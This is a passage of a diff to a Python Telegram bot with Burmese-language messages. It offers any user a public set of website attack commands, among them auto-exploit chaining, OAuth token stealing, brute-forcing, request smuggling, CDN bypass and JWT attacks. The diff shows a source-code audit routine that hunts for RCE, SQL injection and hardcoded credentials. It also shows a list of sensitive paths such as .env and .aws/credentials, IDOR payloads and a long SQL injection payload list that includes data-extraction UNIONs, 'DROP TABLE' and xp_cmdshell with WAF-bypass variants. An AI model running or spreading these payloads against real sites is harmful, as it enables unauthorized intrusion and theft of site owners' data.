-    (r'composer\.json$',          '🔵 composer.json   PHP dependency audit possible'),
-    (r'package\.json$',           '🔵 package.json   JS dependency audit possible'),
-    (r'requirements\.txt$',       '🔵 requirements.txt   Python dependencies'),
-    (r'Gemfile$',                 '🔵 Gemfile   Ruby dependencies'),
+    (r'composer\.json$',          '🔵 composer.json — PHP dependency audit possible'),
+    (r'package\.json$',           '🔵 package.json — JS dependency audit possible'),
+    (r'requirements\.txt$',       '🔵 requirements.txt — Python dependencies'),
+    (r'Gemfile$',                 '🔵 Gemfile — Ruby dependencies'),
 ]
 
-# -- Admin/panel path patterns ------------------------------------------
+# ── Admin/panel path patterns ──────────────────────────────────────────
 _ADMIN_PATH_PATTERNS = re.compile(
-    r'''["'`](/(?:admin|dashboard|panel|manage|control|backend|wp-admin|administrator|'
+    r'''["\x27`](/(?:admin|dashboard|panel|manage|control|backend|wp-admin|administrator|'
     r'phpmyadmin|cpanel|plesk|webmin|manager|superadmin|root|staff|moderator)'
     r'[^"\x27`\s]*?)["\x27`]''',
     re.IGNORECASE
@@ -15126,7 +15376,7 @@ def _codeaudit_sync(domain: str) -> dict:
             _, ext   = os.path.splitext(fl)
             result["stats"]["files_scanned"] += 1
 
-            # -- Check sensitive file names ----------------------------
+            # ── Check sensitive file names ────────────────────────────
             for spat, slabel in _SENSITIVE_FILES:
                 if re.search(spat, fl, re.IGNORECASE):
                     result["sensitive_files"].append({
@@ -15172,7 +15422,7 @@ def _codeaudit_sync(domain: str) -> dict:
                                     "code":  line.strip()[:120],
                                 })
 
-            # -- PHP checks --------------------------------------------
+            # ── PHP checks ────────────────────────────────────────────
             if ext == '.php':
                 _check_pats(_PHP_RCE_PATTERNS,    result["rce"])
                 _check_pats(_PHP_SQLI_PATTERNS,   result["sqli"])
@@ -15181,16 +15431,16 @@ def _codeaudit_sync(domain: str) -> dict:
                 _check_pats(_PHP_UPLOAD_PATTERNS, result["upload"])
                 _check_pats(_CRED_PATTERNS,       result["creds"])
 
-            # -- Python checks -----------------------------------------
+            # ── Python checks ─────────────────────────────────────────
             elif ext == '.py':
                 _check_pats(_PYTHON_VULN_PATTERNS, result["rce"])
                 _check_pats(_CRED_PATTERNS,        result["creds"])
 
-            # -- Config/env checks -------------------------------------
+            # ── Config/env checks ─────────────────────────────────────
             elif ext in ('.env', '.yml', '.yaml', '.ini', '.conf', '.config', '.json'):
                 _check_pats(_CRED_PATTERNS, result["creds"])
 
-            # -- Admin paths in any file -------------------------------
+            # ── Admin paths in any file ───────────────────────────────
             for m in _ADMIN_PATH_PATTERNS.finditer(content):
                 path_val = m.group(1).strip()
                 if path_val not in result["admin_paths"] and len(path_val) >= 4:
@@ -15207,29 +15457,29 @@ def _codeaudit_sync(domain: str) -> dict:
 
 
 async def cmd_codeaudit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/codeaudit <domain>  - Deep backend code audit (PHP/Python/config) after /dl"""
+    """/codeaudit <domain>  — Deep backend code audit (PHP/Python/config) after /dl"""
     if not await check_force_join(update, context):
         return
 
     if not context.args:
         await update.effective_message.reply_text(
-            "🔍 *Code Audit   Backend Vulnerability Scanner*\n\n"
+            "🔍 *Code Audit — Backend Vulnerability Scanner*\n\n"
             "먼저 `/dl <url>` ကိုသုံးပြီး download ဆွဲပါ\n"
             "ပြီးရင် `/codeaudit <domain>` ကိုသုံးပါ\n\n"
             "*Example:*\n"
             "`/dl https://example.com`\n"
             "`/codeaudit example.com`\n\n"
             "*Scan ပြုလုပ်မည်:*\n"
-            "  🔴 *PHP RCE*   eval/exec/system/shell\\_exec\n"
-            "  🔴 *SQL Injection*   direct \\$\\_GET/POST in query\n"
-            "  🔴 *LFI/RFI*   include/require with user input\n"
-            "  🔴 *XSS*   echo \\$\\_GET directly\n"
-            "  🟠 *File Upload*   move\\_uploaded\\_file validation\n"
-            "  🔴 *Hardcoded Creds*   passwords, secrets in code\n"
-            "  📄 *Sensitive Files*   .env, wp-config.php, .htpasswd\n"
-            "  🚪 *Admin Paths*   hidden admin panels in source\n\n"
-            "  🐍 *Python*   eval/exec/os.system/SQLi/SSTI/pickle\n"
-            "  ⚙️ *Config files*   .env/.yml cred scan\n\n"
+            "  🔴 *PHP RCE* — eval/exec/system/shell\\_exec\n"
+            "  🔴 *SQL Injection* — direct \\$\\_GET/POST in query\n"
+            "  🔴 *LFI/RFI* — include/require with user input\n"
+            "  🔴 *XSS* — echo \\$\\_GET directly\n"
+            "  🟠 *File Upload* — move\\_uploaded\\_file validation\n"
+            "  🔴 *Hardcoded Creds* — passwords, secrets in code\n"
+            "  📄 *Sensitive Files* — .env, wp-config.php, .htpasswd\n"
+            "  🚪 *Admin Paths* — hidden admin panels in source\n\n"
+            "  🐍 *Python* — eval/exec/os.system/SQLi/SSTI/pickle\n"
+            "  ⚙️ *Config files* — .env/.yml cred scan\n\n"
             "_Also try: `/analyze <domain>` for JS/secret scan_",
             parse_mode='Markdown'
         )
@@ -15252,7 +15502,7 @@ async def cmd_codeaudit(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   `/stop` နှိပ်ပါ",
+            f"⏳ *`{_active_scans.get(uid)}` running* — `/stop` နှိပ်ပါ",
             parse_mode='Markdown'
         )
         return
@@ -15260,7 +15510,7 @@ async def cmd_codeaudit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     _active_scans.set(uid, "Code Audit")
 
     msg = await update.effective_message.reply_text(
-        f"🔍 *Code Audit   `{domain}`*\n\n"
+        f"🔍 *Code Audit — `{domain}`*\n\n"
         f"🔴 PHP RCE / SQLi / LFI scanning...\n"
         f"🐍 Python vulns checking...\n"
         f"📄 Sensitive files detecting...\n"
@@ -15294,11 +15544,11 @@ async def cmd_codeaudit(update: Update, context: ContextTypes.DEFAULT_TYPE):
         _count_sev(cat)
 
     lines_out = [
-        f"🔍 *Code Audit   `{domain}`*",
-        "--------------------",
+        f"🔍 *Code Audit — `{domain}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"📂 Files: `{st['files_scanned']}` | PHP:`{st['php_files']}` "
         f"| Py:`{st['py_files']}` | Config:`{st['config_files']}`",
-        f"🎯 Total issues: `{st['total_issues']}`   "
+        f"🎯 Total issues: `{st['total_issues']}` — "
         f"🔴`{sev_icon['🔴']}` 🟠`{sev_icon['🟠']}` 🟡`{sev_icon['🟡']}`\n",
     ]
 
@@ -15344,7 +15594,7 @@ async def cmd_codeaudit(update: Update, context: ContextTypes.DEFAULT_TYPE):
             lines_out.append(f"  _...+{len(result['admin_paths'])-8} more_")
         lines_out.append("")
 
-    lines_out.append("--------------------")
+    lines_out.append("━━━━━━━━━━━━━━━━━━━━")
     lines_out.append("_Also: `/analyze` (JS secrets) | `/apitest` (API tokens)_")
 
     report = "\n".join(lines_out)
@@ -15371,7 +15621,7 @@ async def cmd_codeaudit(update: Update, context: ContextTypes.DEFAULT_TYPE):
             document=buf,
             filename=f"codeaudit_{safe_d}_{ts}.json",
             caption=(
-                f"🔍 *Code Audit   `{domain}`*\n"
+                f"🔍 *Code Audit — `{domain}`*\n"
                 f"Issues: `{st['total_issues']}` | "
                 f"🔴`{sev_icon['🔴']}` 🟠`{sev_icon['🟠']}` 🟡`{sev_icon['🟡']}`"
             ),
@@ -15381,13 +15631,13 @@ async def cmd_codeaudit(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.debug("codeaudit export: %s", _e)
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 🚀  MAIN
-# ==================================================
+# ══════════════════════════════════════════════════
 
 
 def main():
-    # -- Single-instance lock (prevents Conflict on Railway redeploy) ------
+    # ── Single-instance lock (prevents Conflict on Railway redeploy) ──────
     import fcntl
     _lock_file_path = os.path.join(DATA_DIR, "bot.lock")
     _lock_file = open(_lock_file_path, "w")
@@ -15397,16 +15647,16 @@ def main():
         _lock_file.flush()
     except OSError:
         print("❌ Another bot instance is already running (lock file held). Exiting.")
-        logger.error("Startup blocked   another instance holds the lock at %s", _lock_file_path)
+        logger.error("Startup blocked — another instance holds the lock at %s", _lock_file_path)
         return
 
     if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("="*55)
+        print("═"*55)
         print("❌  TOKEN ထည့်ဖို့ မမေ့ပါနဲ့ (Line 70 တွင် directly ထည့်ပါ)")
-        print("="*55)
+        print("═"*55)
         return
 
-    # -- Build app with Railway-optimized timeouts -----
+    # ── Build app with Railway-optimized timeouts ─────
     # v46: High-performance connection pool
     request = HTTPXRequest(
         connection_pool_size   = 64,   # Significantly higher pool for parallel extraction
@@ -15415,21 +15665,21 @@ def main():
         write_timeout          = 30.0,
         pool_timeout           = 30.0,
     )
-    # -- Fixed for Python 3.13 + v20.8 compatibility -----
+    # ── Fixed for Python 3.13 + v20.8 compatibility ─────
     app = Application.builder().token(BOT_TOKEN).request(request).build()
 
-    # -- Init asyncio primitives (event loop must be running) -
+    # ── Init asyncio primitives (event loop must be running) ─
     global download_semaphore, scan_semaphore, _active_scans, db_lock, _dl_queue
     download_semaphore = asyncio.Semaphore(MAX_WORKERS)
-    scan_semaphore     = asyncio.Semaphore(1)   # 1 scan at a time   queue system
+    scan_semaphore     = asyncio.Semaphore(1)   # 1 scan at a time — queue system
     db_lock            = asyncio.Lock()
     _dl_queue          = asyncio.Queue(maxsize=QUEUE_MAX)
 
-    # ============================================
+    # ════════════════════════════════════════════
     # 📋  COMMAND HANDLERS
-    # ============================================
+    # ════════════════════════════════════════════
 
-    # -- Core --------------------------------------
+    # ── Core ──────────────────────────────────────
     app.add_handler(CommandHandler("start",     cmd_start))
     app.add_handler(CommandHandler("help",      cmd_help))
     app.add_handler(CommandHandler("status",    cmd_status))
@@ -15438,29 +15688,29 @@ def main():
     app.add_handler(CommandHandler("stop",      cmd_stop))
     app.add_handler(CommandHandler("resume",    cmd_resume))
 
-    # -- Download (merged: /download /fullsite /jsdownload /jsfullsite) --
+    # ── Download (merged: /download /fullsite /jsdownload /jsfullsite) ──
     app.add_handler(CommandHandler("dl",        cmd_dl))
 
-    # -- Security Scanner (merged: /vuln /fuzz /smartfuzz /bypass403) --
+    # ── Security Scanner (merged: /vuln /fuzz /smartfuzz /bypass403) ──
     app.add_handler(CommandHandler("scan",      cmd_scan))
 
-    # -- Recon (merged: /tech /headers /whois /cookies /robots /links) --
+    # ── Recon (merged: /tech /headers /whois /cookies /robots /links) ──
     app.add_handler(CommandHandler("recon",     cmd_recon))
 
-    # -- Discovery (merged: /extract /subdomains) --
+    # ── Discovery (merged: /extract /subdomains) ──
     app.add_handler(CommandHandler("discover",  cmd_discover))
     app.add_handler(CommandHandler("api",          cmd_api))          # Admin Panel Finder (v41)
     app.add_handler(CommandHandler("api_discover", cmd_api_discover)) # API Endpoint Discovery
 
-    # -- Monitoring --------------------------------
+    # ── Monitoring ────────────────────────────────
     app.add_handler(CommandHandler("monitor",   cmd_monitor))
 
-    # -- Standalone tools --------------------------
+    # ── Standalone tools ──────────────────────────
     app.add_handler(CommandHandler("screenshot",cmd_screenshot))
     app.add_handler(CommandHandler("appassets", cmd_appassets))
     app.add_handler(CommandHandler("jwtattack", cmd_jwtattack))
 
-    # -- Admin -------------------------------------
+    # ── Admin ─────────────────────────────────────
     app.add_handler(CommandHandler("admin",     cmd_admin))
     app.add_handler(CommandHandler("ban",       cmd_ban))
     app.add_handler(CommandHandler("unban",     cmd_unban))
@@ -15472,7 +15722,7 @@ def main():
     app.add_handler(CommandHandler("adminset",  cmd_adminset))  # merged: /setlimit /setpages /setassets
     app.add_handler(CommandHandler("botstats",  cmd_botstats))  # NEW: real-time perf dashboard
 
-    # -- v43 NEW FEATURE HANDLERS ---------------------------------
+    # ── v43 NEW FEATURE HANDLERS ─────────────────────────────────
     app.add_handler(CommandHandler("tech_stack",          cmd_tech_stack))
     app.add_handler(CommandHandler("api_fuzzer",          cmd_api_fuzzer))
     app.add_handler(CommandHandler("password_leak_check", cmd_password_leak_check))
@@ -15490,21 +15740,21 @@ def main():
     app.add_handler(CommandHandler("speed_audit",         cmd_speed_audit))
 
 
-    # -- File upload handler ------------------------
+    # ── File upload handler ────────────────────────
     app.add_handler(MessageHandler(filters.Document.ALL, handle_app_upload))
 
-    # -- V20 New Feature Commands ------------------
+    # ── V20 New Feature Commands ──────────────────
     app.add_handler(CommandHandler("cloudcheck", cmd_cloudcheck))
     app.add_handler(CommandHandler("paramfuzz",  cmd_paramfuzz))
     app.add_handler(CommandHandler("autopwn",    cmd_autopwn))
-    # -- V26 New Features --------------------------
+    # ── V26 New Features ──────────────────────────
     app.add_handler(CommandHandler("bruteforce", cmd_bruteforce))
     app.add_handler(CommandHandler("sourcemap",  cmd_sourcemap))
     app.add_handler(CommandHandler("gitexposed", cmd_gitexposed))
-    # -- v28.1 New Scanners ------------------------
+    # ── v28.1 New Scanners ────────────────────────
     app.add_handler(CommandHandler("secretscan",   cmd_secretscan))
 
-    # -- v31 New Commands --------------------------
+    # ── v31 New Commands ──────────────────────────
     app.add_handler(CommandHandler("analyze",   cmd_analyze))    # JS secret/route scanner
     app.add_handler(CommandHandler("apitest",   cmd_apitest))    # API token extractor
     app.add_handler(CommandHandler("afterdl",   cmd_afterdl))    # guide command
@@ -15512,13 +15762,13 @@ def main():
     app.add_handler(CommandHandler("gofileinfo", cmd_gofileinfo))  # gofile.io account status (admin)
     app.add_handler(CommandHandler("cleandl",   cmd_cleandl))     # clean downloaded sources (admin)
 
-    # -- v35 New Proxy Commands --------------------
+    # ── v35 New Proxy Commands ────────────────────
     app.add_handler(CommandHandler("proxy_download", cmd_proxy_download))  # Download through proxy
     app.add_handler(CommandHandler("proxy_status",   cmd_proxy_status))    # Pool health dashboard
     app.add_handler(CommandHandler("proxy_refresh",  cmd_proxy_refresh))   # Force re-validate pool
     app.add_handler(CommandHandler("proxy_add",      cmd_proxy_add))       # Manually add a proxy
 
-    # -- v43.5 Advanced Attack Commands ------------
+    # ── v43.5 Advanced Attack Commands ────────────
     app.add_handler(CommandHandler("smuggling_tester", cmd_smuggling_tester))
     app.add_handler(CommandHandler("h2c_smuggling",    cmd_h2c_smuggling))
     app.add_handler(CommandHandler("oauth_steal",      cmd_oauth_steal))
@@ -15527,7 +15777,7 @@ def main():
     app.add_handler(CommandHandler("graphql_batch",    cmd_graphql_batch))
     app.add_handler(CommandHandler("js_restore",       cmd_js_restore))
 
-    # -- Callbacks ---------------------------------
+    # ── Callbacks ─────────────────────────────────
     app.add_handler(CallbackQueryHandler(force_join_callback,    pattern="^fj_check$"))
     app.add_handler(CallbackQueryHandler(appassets_cat_callback, pattern="^apa_"))
     app.add_handler(CallbackQueryHandler(admin_callback,         pattern="^adm_"))
@@ -15535,32 +15785,32 @@ def main():
     app.add_handler(CallbackQueryHandler(help_category_callback, pattern="^help_"))
     # Custom wordlist upload
 
-    # -- Global error handler ----------------------
+    # ── Global error handler ──────────────────────
     app.add_error_handler(error_handler)
 
-    print("+==========================================+")
-    print("|  Website Downloader Bot v28.1 Railway    |")
-    print("|  --------------------------------------- |")
-    print("|  SSRF + Path Traversal: ✅               |")
-    print("|  SECRET_KEY persistent: ✅               |")
-    print("|  Log Rotation 5MB×3:    ✅               |")
-    print(f"|  Rate Limit: ✅ ({RATE_LIMIT_SEC}s)              |")
+    print("╔══════════════════════════════════════════╗")
+    print("║  Website Downloader Bot v28.1 Railway    ║")
+    print("║  ─────────────────────────────────────── ║")
+    print("║  SSRF + Path Traversal: ✅               ║")
+    print("║  SECRET_KEY persistent: ✅               ║")
+    print("║  Log Rotation 5MB×3:    ✅               ║")
+    print(f"║  Rate Limit: ✅ ({RATE_LIMIT_SEC}s)              ║")
     _db_type = "SQLite (WAL)" if os.path.exists(SQLITE_FILE) else "SQLite (init)"
-    print(f"|  Database  : {_db_type:<35} |")
-    print(f"|  JS Puppeteer: {'✅' if PUPPETEER_OK else '❌ (optional)'}                        |")
-    print("+==========================================+")
+    print(f"║  Database  : {_db_type:<35} ║")
+    print(f"║  JS Puppeteer: {'✅' if PUPPETEER_OK else '❌ (optional)'}                        ║")
+    print("╚══════════════════════════════════════════╝")
 
-    # -- Bug fix: _start_background defined OUTSIDE retry loop --
+    # ── Bug fix: _start_background defined OUTSIDE retry loop ──
     async def _start_background(application):
         """Background tasks + set bot command list"""
         global _monitor_app_ref
         _monitor_app_ref = application
-        # -- Spawn NUM_QUEUE_WORKERS parallel download workers ----------
+        # ── Spawn NUM_QUEUE_WORKERS parallel download workers ──────────
         for _wid in range(NUM_QUEUE_WORKERS):
             asyncio.create_task(queue_worker(worker_id=_wid))
         asyncio.create_task(auto_delete_loop())
         asyncio.create_task(monitor_loop())
-        # -- Periodic scan cache cleanup (every 10 min) ------------------
+        # ── Periodic scan cache cleanup (every 10 min) ──────────────────
         async def _cache_cleanup_loop():
             while True:
                 await asyncio.sleep(600)
@@ -15571,10 +15821,10 @@ def main():
             NUM_QUEUE_WORKERS
         )
 
-        # -- Register bot commands (Telegram "/" menu) ------------------
+        # ── Register bot commands (Telegram "/" menu) ──────────────────
         from telegram import BotCommand, BotCommandScopeDefault, BotCommandScopeChat
 
-        # -- User commands (all users မြင်ရ) ----------------------------
+        # ── User commands (all users မြင်ရ) ────────────────────────────
         user_commands = [
             BotCommand("start",        "🚀 Bot စတင်ရန်"),
             BotCommand("help",         "📚 Commands အားလုံးကြည့်ရန်"),
@@ -15618,13 +15868,13 @@ def main():
             BotCommand("subdomain_enum",      "🔎 Subdomain Enumeration"),
             BotCommand("cms_detect",          "📝 CMS Version Detection"),
             BotCommand("speed_audit",         "⚡ Website Speed & Performance Audit"),
-            # -- v35 Proxy Commands -----------------------------------------
+            # ── v35 Proxy Commands ─────────────────────────────────────────
             BotCommand("proxy_download",  "🌐 Download through proxy"),
             BotCommand("proxy_status",    "📊 Proxy pool health dashboard"),
             BotCommand("proxy_refresh",   "🔄 Force re-validate proxy pool"),
             BotCommand("proxy_add",       "➕ Manually add a proxy"),
             BotCommand("api",             "🔌 API endpoint tester"),
-            # -- v43.5 Advanced Attack Commands ----------------------------
+            # ── v43.5 Advanced Attack Commands ────────────────────────────
             BotCommand("smuggling_tester", "⚔️ HTTP Request Smuggling (CL.TE/TE.CL)"),
             BotCommand("h2c_smuggling",    "⚔️ HTTP/2 Cleartext smuggling"),
             BotCommand("oauth_steal",      "🔑 OAuth token steal test"),
@@ -15634,7 +15884,7 @@ def main():
             BotCommand("js_restore",       "🕵️ JS bundle secret restore"),
         ]
 
-        # -- Admin commands (Admin IDs သာ မြင်ရ) -------------------------
+        # ── Admin commands (Admin IDs သာ မြင်ရ) ─────────────────────────
         admin_commands = user_commands + [
             BotCommand("admin",       "🛠️ Admin panel"),
             BotCommand("ban",         "🚫 User ban"),
@@ -15650,13 +15900,13 @@ def main():
         ]
 
         try:
-            # Default scope   user commands (everyone)
+            # Default scope — user commands (everyone)
             await application.bot.set_my_commands(
                 user_commands,
                 scope=BotCommandScopeDefault()
             )
 
-            # Per-admin scope   admin commands (only admins)
+            # Per-admin scope — admin commands (only admins)
             for admin_id in ADMIN_IDS:
                 try:
                     await application.bot.set_my_commands(
@@ -15673,23 +15923,23 @@ def main():
 
     app.post_init = _start_background
 
-    # -- SIGTERM handler   Railway graceful shutdown ----
+    # ── SIGTERM handler — Railway graceful shutdown ────
     import signal
     _shutdown_event = asyncio.Event() if False else None  # placeholder
 
     def _handle_sigterm(*_):
-        logger.info("SIGTERM received   shutting down gracefully...")
-        print("\n🛑 SIGTERM received   shutting down...")
+        logger.info("SIGTERM received — shutting down gracefully...")
+        print("\n🛑 SIGTERM received — shutting down...")
         _reset_session_pool()   # V31: close all pooled sessions cleanly
         raise KeyboardInterrupt
 
     signal.signal(signal.SIGTERM, _handle_sigterm)
 
-    # -- SQLite init + JSON migration --------------------------
+    # ── SQLite init + JSON migration ──────────────────────────
     _sqlite_init()
     _migrate_json_to_sqlite()
 
-    # -- Retry loop   Network error recovery ---------------
+    # ── Retry loop — Network error recovery ───────────────
     MAX_RETRIES = 10
     RETRY_DELAY = 10
 
@@ -15706,48 +15956,48 @@ def main():
         except TimedOut as e:
             logger.warning("TimedOut (attempt %d): %s", attempt, e)
             if attempt < MAX_RETRIES:
-                print(f"⚠️  Timeout   {RETRY_DELAY}s နောက်မှ retry ({attempt}/{MAX_RETRIES})...")
+                print(f"⚠️  Timeout — {RETRY_DELAY}s နောက်မှ retry ({attempt}/{MAX_RETRIES})...")
                 import time as _time; _time.sleep(RETRY_DELAY)
             else:
-                print("❌ Max retries ပြည့်ပါပြီ   Network စစ်ပါ")
+                print("❌ Max retries ပြည့်ပါပြီ — Network စစ်ပါ")
         except NetworkError as e:
             logger.warning("NetworkError (attempt %d): %s", attempt, e)
             if attempt < MAX_RETRIES:
-                print(f"⚠️  Network error   {RETRY_DELAY}s နောက်မှ retry ({attempt}/{MAX_RETRIES})...")
+                print(f"⚠️  Network error — {RETRY_DELAY}s နောက်မှ retry ({attempt}/{MAX_RETRIES})...")
                 import time as _time; _time.sleep(RETRY_DELAY)
             else:
-                print("❌ Max retries ပြည့်ပါပြီ   Network စစ်ပါ")
+                print("❌ Max retries ပြည့်ပါပြီ — Network စစ်ပါ")
         except KeyboardInterrupt:
             print("\n👋 Bot stopped.")
             break
         except Conflict as e:
-            logger.warning("Conflict (attempt %d): %s   another instance may still be shutting down", attempt, e)
+            logger.warning("Conflict (attempt %d): %s — another instance may still be shutting down", attempt, e)
             if attempt < MAX_RETRIES:
                 _conflict_wait = 30  # wait longer so the old instance fully releases getUpdates
-                print(f"⚠️  Conflict   {_conflict_wait}s စောင့်ပြီး retry ({attempt}/{MAX_RETRIES})...")
+                print(f"⚠️  Conflict — {_conflict_wait}s စောင့်ပြီး retry ({attempt}/{MAX_RETRIES})...")
                 import time as _time; _time.sleep(_conflict_wait)
             else:
                 print("❌ Conflict: Only one bot instance can run at a time. Stop any other running instances.")
 
-# +==============================================================+
-# |              V20 NEW FEATURES ADDON                          |
-# |  ① /techstack    Deep Tech Fingerprint (Wappalyzer-style)   |
-# |  ② /sqli         SQL Injection Tester                       |
-# |  ③ /xss          XSS Vulnerability Scanner                  |
-# |  ④ /cloudcheck   Real IP / CDN Bypass Finder                |
-# |  ⑤ /paramfuzz    Advanced Parameter Fuzzer (Arjun-style)    |
-# |  ⑥ /autopwn      Full Auto Exploit Chain                    |
-# |  ⑦ /bulkscan     Bulk URL Scanner (txt file upload)         |
-# +==============================================================+
+# ╔══════════════════════════════════════════════════════════════╗
+# ║              V20 NEW FEATURES ADDON                          ║
+# ║  ① /techstack  — Deep Tech Fingerprint (Wappalyzer-style)   ║
+# ║  ② /sqli       — SQL Injection Tester                       ║
+# ║  ③ /xss        — XSS Vulnerability Scanner                  ║
+# ║  ④ /cloudcheck — Real IP / CDN Bypass Finder                ║
+# ║  ⑤ /paramfuzz  — Advanced Parameter Fuzzer (Arjun-style)    ║
+# ║  ⑥ /autopwn    — Full Auto Exploit Chain                    ║
+# ║  ⑦ /bulkscan   — Bulk URL Scanner (txt file upload)         ║
+# ╚══════════════════════════════════════════════════════════════╝
 
-# ==================================================
-# ① /techstack   Deep Tech Fingerprint
-# ==================================================
+# ══════════════════════════════════════════════════
+# ① /techstack — Deep Tech Fingerprint
+# ══════════════════════════════════════════════════
 
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 📂  SENSITIVE PATHS (Feature 4)
-# ==================================================
+# ══════════════════════════════════════════════════
 _SENSITIVE_PATHS = [
     "/.env", "/.env.local", "/.env.production", "/.env.backup", "/.git/config",
     "/.svn/entries", "/.htaccess", "/config.php", "/config.php.bak", "/wp-config.php",
@@ -15758,9 +16008,9 @@ _SENSITIVE_PATHS = [
     "/.aws/credentials", "/.npmrc", "/.bash_history", "/.zsh_history"
 ]
 
-# ==================================================
+# ══════════════════════════════════════════════════
 # 🔌  BOLA / IDOR PAYLOADS (Feature 6)
-# ==================================================
+# ══════════════════════════════════════════════════
 _BOLA_PAYLOADS = [
     "0", "1", "1000", "1001", "9999", "-1", "admin", "test", "user", "guest"
 ]
@@ -15823,18 +16073,18 @@ _NOTABLE_HEADERS = frozenset({
 })
 
 _SQLI_PAYLOADS_BASIC = [
-    # -- Error-based   quote break (all DB types) ---------------------
+    # ── Error-based — quote break (all DB types) ─────────────────────
     "'", '"', "`", "''", '""', "\\", "%27", "%22", "%60",
     "' OR '1'='1", "' OR 1=1--", '" OR "1"="1',
     "' OR 'x'='x", "') OR ('x'='x", "') OR ('1'='1",
     "' OR 1=1#", "' OR 1=1/*", '") OR ("1"="1',
     "' OR 1=1--+", "' OR 1=1-- -", "') OR 1=1--",
     "\" OR 1=1--", "\" OR 1=1#", "') OR '1'='1'--",
-    # -- ORDER BY enumeration -----------------------------------------
+    # ── ORDER BY enumeration ─────────────────────────────────────────
     "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
     "1' ORDER BY 4--", "1' ORDER BY 5--", "1' ORDER BY 10--",
     "1 ORDER BY 1--", "1 ORDER BY 2--", "1 ORDER BY 3--",
-    # -- UNION SELECT   null probes -----------------------------------
+    # ── UNION SELECT — null probes ───────────────────────────────────
     "1' UNION SELECT null--",
     "1' UNION SELECT null,null--",
     "1' UNION SELECT null,null,null--",
@@ -15846,7 +16096,7 @@ _SQLI_PAYLOADS_BASIC = [
     "' AND 1=0 UNION ALL SELECT NULL,NULL,NULL,NULL--",
     "1 UNION SELECT null--",
     "1 UNION ALL SELECT null,null--",
-    # -- Information schema / data extraction -------------------------
+    # ── Information schema / data extraction ─────────────────────────
     "' UNION SELECT table_name,NULL FROM information_schema.tables--",
     "' UNION SELECT column_name,NULL FROM information_schema.columns--",
     "' UNION SELECT username,password FROM users--",
@@ -15855,43 +16105,43 @@ _SQLI_PAYLOADS_BASIC = [
     "' UNION SELECT database(),NULL--",
     "' UNION SELECT @@hostname,@@datadir--",
     "' UNION SELECT schema_name FROM information_schema.schemata--",
-    # -- Stacked queries ----------------------------------------------
+    # ── Stacked queries ──────────────────────────────────────────────
     "'; DROP TABLE users--",
     "'; SELECT SLEEP(0)--",
     "1; SELECT 1--",
     "1'; SELECT '1",
     "1'; INSERT INTO--",
-    # -- Boolean-based quick checks -----------------------------------
+    # ── Boolean-based quick checks ───────────────────────────────────
     "1 AND 1=1", "1 AND 1=2",
     "1' AND '1'='1", "1' AND '1'='2",
     "1 AND 1=1--", "1 AND 1=2--",
     "1 AND (SELECT 1)=1", "1 AND (SELECT 1)=2",
-    # -- Error triggers   MySQL ---------------------------------------
+    # ── Error triggers — MySQL ───────────────────────────────────────
     "extractvalue(1,concat(0x7e,(SELECT version())))",
     "updatexml(1,concat(0x7e,(SELECT database())),1)",
     "1' AND extractvalue(rand(),concat(0x7e,(SELECT version())))--",
     "1' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
     "' AND (SELECT 6765 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-    # -- Error triggers   MSSQL ---------------------------------------
+    # ── Error triggers — MSSQL ───────────────────────────────────────
     "CONVERT(int,(SELECT TOP 1 name FROM sysobjects))",
     "1/0",
     "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
     "1' AND 1=(SELECT name FROM sys.databases WHERE database_id=1)--",
-    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",  # RCE probe (safe   localhost only)
-    # -- Error triggers   Oracle --------------------------------------
+    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",  # RCE probe (safe — localhost only)
+    # ── Error triggers — Oracle ──────────────────────────────────────
     "' AND 1=(SELECT 1 FROM dual)--",
     "' UNION SELECT NULL FROM dual--",
     "' UNION SELECT banner FROM v$version WHERE rownum=1--",
     "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--",
-    # -- Error triggers   PostgreSQL ----------------------------------
+    # ── Error triggers — PostgreSQL ──────────────────────────────────
     "' AND 1=CAST(version() AS integer)--",
     "' AND 1=CAST(pg_sleep(0) AS integer)--",
     "1' AND 1=(SELECT CAST(version() AS numeric))--",
-    # -- Error triggers   SQLite ---------------------------------------
+    # ── Error triggers — SQLite ───────────────────────────────────────
     "1' AND 1=LOAD_EXTENSION(char(0x2e,0x2f,0x6c,0x69,0x62,0x65,0x76,0x69,0x6c))--",
     "1' UNION SELECT sqlite_version()--",
     "1' UNION SELECT name FROM sqlite_master WHERE type='table'--",
-    # -- WAF bypass   comment-based ------------------------------------
+    # ── WAF bypass — comment-based ────────────────────────────────────
     "1'/**/OR/**/'1'='1",
     "1' OR 1=1 LIMIT 1--",
     "1'%20OR%20'1'='1",
@@ -15903,27 +16153,27 @@ _SQLI_PAYLOADS_BASIC = [
     "1'%0AOR%0A1=1--",    # newline bypass
     "1';--",
     "1'%00",              # null byte
-    # -- WAF bypass   case + encoding ---------------------------------
+    # ── WAF bypass — case + encoding ─────────────────────────────────
     "1' oR '1'='1",
     "1' Or '1'='1",
     "1'/*comment*/OR/*comment*/'1'='1",
     "1' /*!OR*/ '1'='1",  # MySQL inline comment
     "1' /*!50000OR*/ '1'='1",
-    # -- Second-order / JSON injection --------------------------------
+    # ── Second-order / JSON injection ────────────────────────────────
     "1';--",
     "{\"$gt\": \"\"}",
     "{\"$ne\": null}",
     "{\"$regex\": \".*\"}",
-    # -- DB2 / IBM specific --------------------------------------------
+    # ── DB2 / IBM specific ────────────────────────────────────────────
     "1' UNION SELECT NULL FROM sysibm.sysdummy1--",
     "' OR 1=1 FROM sysibm.sysdummy1--",
-    # -- MariaDB specific ----------------------------------------------
